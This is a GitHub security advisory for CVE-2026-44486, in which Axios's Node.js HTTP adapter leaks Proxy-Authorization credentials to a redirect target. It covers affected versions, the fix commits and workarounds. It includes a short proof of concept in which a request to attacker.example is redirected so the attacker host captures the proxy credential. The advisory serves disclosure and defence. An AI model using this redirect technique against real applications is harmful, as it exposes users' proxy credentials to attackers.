# [H] Axios: Proxy-Authorization header leaks to redirect target when proxy is re-evaluated to direct connection

## Summary
Severity: High
Advisory: GHSA-j5f8-grm9-p9fc
CVE: CVE-2026-44486
CWE: CWE-200
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-04
Source: https://github.com/advisories/GHSA-j5f8-grm9-p9fc
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.16.0
- npm: `axios` — affected >=0 <0.32.0

## Details
### Summary

Axios’ Node.js HTTP adapter can leak proxy credentials to a redirect target in affected versions. When a request is sent through an authenticated proxy, Axios may add a `Proxy-Authorization` header. If Axios then follows a redirect and the redirected request is no longer sent through that proxy, the stale `Proxy-Authorization` header can remain on the redirected request and be sent to the redirect target.

This affects Node.js's use of Axios with automatic redirects enabled and an authenticated proxy configuration. Browser adapters are not affected.

### Impact

An attacker who controls a server that the victim application requests can redirect the request so that the attacker-controlled redirect target receives the victim’s proxy credentials.

The most relevant case is a Node.js application using an authenticated `HTTP_PROXY` for an initial `http://` request, with redirects enabled, where the redirect target resolves to no proxy, such as an `https://` URL when `HTTPS_PROXY` is unset.

This does not affect browser, XHR, or fetch adapter behaviour. It also does not affect requests with `maxRedirects: 0`.

### Affected Functionality

Affected functionality is limited to the Node.js HTTP adapter in `lib/adapters/http.js`.

Relevant inputs and settings include:

- `HTTP_PROXY`, `HTTPS_PROXY`, and `NO_PROXY`.
- Authenticated proxy URLs such as `http://user:pass@proxy.example:8080`.
- Automatic redirect following through `follow-redirects`.
- Axios proxy handling in `setProxy()`.
- Redirect proxy handling through `beforeRedirects.proxy`.

### Technical Details

In affected v1 releases, `setProxy()` adds `Proxy-Authorization` when a proxy with credentials is selected, but redirect handling calls `setProxy()` again without first clearing any existing proxy authorization header.

If the redirected URL resolves to no proxy, `setProxy()` does not add a new proxy configuration and also does not remove the old header. The redirected request can therefore carry the stale `Proxy-Authorization` header to the final origin.

The v1 fix in `afca61a` adds an `isRedirect` path that deletes any case variant of `Proxy-Authorization` before proxy settings are re-applied on redirect. The v0 backport in `2af6116` fixed the 0.x line for `0.32.0`.

### Proof of Concept of Attack

```js
process.env.HTTP_PROXY = 'http://user:pass@127.0.0.1:8080';
delete process.env.HTTPS_PROXY;

await axios.get('http://attacker.example/start');
```

Attacker-controlled HTTP endpoint:

```http
HTTP/1.1 302 Found
Location: https://attacker.example/final
```

Expected result on affected versions:

```text
https://attacker.example/final receives:
Proxy-Authorization: Basic dXNlcjpwYXNz
```

Expected result on fixed versions:

```text
https://attacker.example/final receives no Proxy-Authorization header
```

### Workarounds

Set `maxRedirects: 0` and handle redirects manually.

Avoid using authenticated proxy environment variables for requests to untrusted HTTP origins unless redirect behaviour is controlled.

Ensure proxy environment variables are configured consistently across protocols so redirects do not unexpectedly change from proxied to direct connections.

<details>
<summary>Original Source</summary>

### Summary
Axios' Node.js HTTP adapter can leak proxy credentials to a redirect target origin. When an initial request is sent through an authenticated HTTP proxy, Axios adds a `Proxy-Authorization` header. On redirect, Axios re-evaluates proxy settings, but if the redirected request no longer uses a proxy, the stale `Proxy-Authorization` header is not cleared. As a result, the redirect target can receive the proxy credential directly.

This issue affects the Node.js HTTP adapter and can be reproduced when the initial request uses `HTTP_PROXY` with authentication, redirects are enabled, and the redirected request is resolved to no proxy, such as when `HTTPS_PROXY` is unset or the redirect target is excluded by `NO_PROXY`.

### Details
In the current implementation:

- `setProxy()` adds `Proxy-Authorization` when a proxy with credentials is in use.
- On redirects, Axios re-invokes `setProxy()` for the redirected request.
- If the redirected URL re-evaluates to "no proxy", `setProxy()` does not clear the previously added `Proxy-Authorization` header.
- The redirected request therefore reuses the stale header and sends it to the final origin.

Relevant code locations:

- `lib/adapters/http.js`
- `setProxy()` adds `Proxy-Authorization`
- redirect handling re-applies proxy logic through `beforeRedirects.proxy`
- no cleanup is performed when the recomputed redirect request no longer uses a proxy

### PoC
1. The victim sends `GET http://<attacker-site>/start`
2. The request goes through a local authenticated `corp proxy`
3. The attacker-controlled HTTP endpoint returns `302 Location: https://<attacker-site>/final`
4. The redirected HTTPS request no longer uses a proxy
5. The attacker-controlled HTTPS endpoint receives the stale `Proxy-Authorization` header

Observed output:

```text
[corp-proxy] Proxy-Authorization received: Basic dXNlcjpwYXNz
[attacker-http] GET /start
[attacker-https] GET /final
[attacker-https] Proxy-Authorization received: Basic dXNlcjpwYXNz
Leak reproduced: Proxy-Authorization was sent to the attacker HTTPS origin.
```

This demonstrates that the proxy credential is exposed to the redirect target origin.

### Impact
Exposes authenticated proxy credentials to an attacker-controlled origin.
</details>

---

## References
- https://github.com/axios/axios/security/advisories/GHSA-j5f8-grm9-p9fc
- https://nvd.nist.gov/vuln/detail/CVE-2026-44486
- https://github.com/axios/axios/pull/10794
- https://github.com/axios/axios/commit/afca61a070728e717203c2bc21e7b589b59b858b
- https://github.com/axios/axios
- https://github.com/axios/axios/releases/tag/v0.32.0
- https://github.com/axios/axios/releases/tag/v1.16.0
